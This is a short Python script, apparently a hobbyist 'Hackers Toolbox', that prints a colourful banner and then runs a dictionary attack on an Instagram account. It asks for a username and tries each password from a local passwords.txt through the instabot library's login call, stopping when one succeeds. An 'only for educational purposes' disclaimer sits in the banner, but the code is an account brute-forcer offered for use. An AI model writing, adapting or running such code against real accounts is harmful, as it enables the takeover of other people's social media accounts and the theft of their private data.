#from instabot import Bot
# import subprocess
import time
import os
import colorama
from colorama import init, Fore, Back, Style

def vycistit():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def hlavni_cast():
    print(Style.RESET_ALL + "╔═════════════════════════════════════════════════════════════════════╗")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + "....................." + Style.RESET_ALL + "Welcome in Hackers Toolbox" + Fore.RED + "......................" + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "........................" + Style.RESET_ALL + "Created by: Danb1551" + Fore.GREEN + "........................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + ".........................." + Style.RESET_ALL + "Web: TERMUX.WZ.CZ" + Fore.BLUE + ".........................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "......................" + Style.RESET_ALL + "Instagram: hackit.121212" + Fore.MAGENTA + "......................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "..................." + Style.RESET_ALL + "E-mail: hackit.121212@gmail.com" + Fore.CYAN + "..................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + "................" + Style.RESET_ALL + " \U0001F600" + " ONLY FOR EDUCATIONAL PURPOSES " + "\U0001F600 " + Fore.RED + "................" + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("╚═════════════════════════════════════════════════════════════════════╝")

vycistit()
hlavni_cast()
time.sleep(0.25)
def login_with_password(username, password):
    bot = Bot()
    if bot.login(username=username, password=password):
        print(f"Succesfuly loged in with password:  {password}")
        return True
    else:
        print(f"Failed with password: {password}")
        return False

def main():
    username = input("What is the username: ")
    print("")
    with open("passwords.txt", "r") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        if login_with_password(username, password):
            break

if __name__ == "__main__":
    main()